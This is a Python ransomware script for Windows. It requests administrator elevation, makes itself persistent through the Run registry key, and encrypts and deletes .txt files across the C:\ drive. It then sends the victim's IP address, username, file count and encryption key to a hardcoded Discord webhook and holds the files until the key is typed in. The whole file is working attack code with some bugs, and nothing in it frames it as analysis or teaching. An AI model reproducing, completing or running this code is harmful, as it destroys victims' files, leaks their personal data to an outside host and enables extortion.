import os
from pathlib import Path
from cryptography.fernet import Fernet
from requests import get
import requests
import tkinter as tk
import winreg
import ctypes
import sys
 
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
 
if not is_admin():
    print("Requesting elevated permissions...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
# Your main code here
print("Running with elevated privileges!")
 
url = "https://discord.com/api/webhooks/1067559491022893076/Ih_D4FYKo593-8fhTBGBqFaGKuLnPWHfQWjkMBk0TY-aIS-CmhMCpUCc68wBuUYrYcpU"
 
ip = get('https://api.ipify.org').content.decode('utf8')
 
key = Fernet.generate_key()
 
def registry_key_exists(path):
    try:
        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
        return True
    except FileNotFoundError:
        print("first run")
        return False  
 
if not registry_key_exists(r"Software\Microsoft\Windows\CurrentVersion\Run"):
    try:
        runKey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
 
        python_exe = os.path.join(os.path.dirname(os.__file__), 'python3.11.exe')
 
        command = f'"{python_exe}" "{os.path.abspath(__file__)}"'
 
 
        winreg.SetValueEx(runKey, "Script", 0, winreg.REG_SZ, command)
 
        winreg.CloseKey(runKey)
        print(f"Added script to startup.")
    except Exception as e:
            print(f"Failed to add script to startup.")
            exit(1)
 
    key = Fernet.generate_key()
 
    def safeKey(key):
        try:
            value_name = "Key"
            safeKey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\safeKey")
 
            winreg.SetValueEx(safeKey, value_name, 0, winreg.REG_SZ, key)
 
 
            winreg.CloseKey(safeKey)
            print(f"Added script to startup.")
        except Exception as e:
            print(f"Failed t add script to startup.")
 
 
 
 
 
    try:
        active_user = os.getlogin()
    except Exception as e:
        print(f"An error occurred while getting the active user: {e}")
        active_user = "default_user"
 
 
 
    extensions = [".txt"]
    fileList = []
 
    try:
        for curExt in extensions:
            for root, dirs, files in os.walk(r"C:\\"):
                for file in files:
                    if file.endswith(curExt):
                        fileList.append(os.path.join(root, file))
    except Exception as e:
        print(f"An error occurred during file searching: {e}")
 
    f = Fernet(key)
 
    fileCounter = 0
 
    for file in fileList:
        try:
            with open(file, 'rb') as original_file:
                file_data = original_file.read()
            encrypted_data = f.encrypt(file_data)
            with open(file + '.enc', 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            os.remove(file)
            fileCounter += 1
        except Exception as e:
            print(f"Error processing {file}: {e}")
 
 
    if key is None:
        print("Error: Encryption key was not generated.")
        exit(1)
 
    data = {
        "embeds": [
            {
                "description": f"**IP Address**: {ip}\n**User**: {active_user}\n**Encryption Status**: Files encrypted successfully",
                "title": "System Information",
                "fields": [
                    {
                        "name": "Encryption Key",
                        "value": key.decode(),  # Convert bytes to string
                        "inline": True
                    },
                    {
                        "name": "Encrypted Files Count",
                        "value": str(fileCounter),
                        "inline": True
                    },
                    {
                        "name": "Operating System",
                        "value": os.name,
                        "inline": False
                    }
                ]
            }
        ]
    }
 
    # Send the POST request
    result = requests.post(url, json=data)
 
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print(f"Payload delivered successfully, code {result.status_code}.")
 
else:
    try:
        value_name = "Key"
        openKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Key")
 
        value_data, value_type = winreg.QueryValueEx(openKey, value_name)
 
        winreg.CloseKey(openKey)
 
        key = value_data
    except FileNotFoundError:
        print(f"Registry key  does not exist.")
    except Exception as e:
        print(f"Failed to retrieve value: {e}")
 
 
inputKey = ""
while inputKey != key.decode():
    print("Enter Decryption Key")
    inputKey = input()
 
for file in fileList:
    encrypted_file_path = file + '.enc'
    try:
        with open(encrypted_file_path, 'rb') as encrypted_file:
            encrypted_data = encrypted_file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(file, 'wb') as original_file:
            original_file.write(decrypted_data)
        os.remove(encrypted_file_path)
    except Exception as e:
        print(f"Error processing {encrypted_file_path}: {e}")
 
print(key)